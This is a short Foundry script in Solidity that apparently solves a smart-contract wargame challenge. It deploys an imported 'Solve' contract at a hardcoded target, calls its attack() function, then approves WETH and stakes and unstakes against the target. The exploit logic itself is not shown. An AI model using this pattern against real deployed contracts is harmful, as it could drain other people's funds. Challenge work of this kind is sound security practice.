// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "../src/Solve.sol";
import "forge-std/console.sol";

contract Deploy is Script {
    address eoa = vm.addr(vm.envUint("USER_PRIVATE_KEY"));
    address target = 0x5DAC10aed335eDD81877C8F2DFD4c6B2b38E73b1;
    address weth = IStake(target).WETH();
    bool result;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        Solve solve = new Solve{value: 0.0012 ether}(target);

        solve.attack();

        IWETH(weth).approve(target, type(uint256).max);

        IStake(target).StakeWETH(0.0011 ether);
        result = IStake(target).Unstake(0.0011 ether);

        vm.stopBroadcast();
    }
}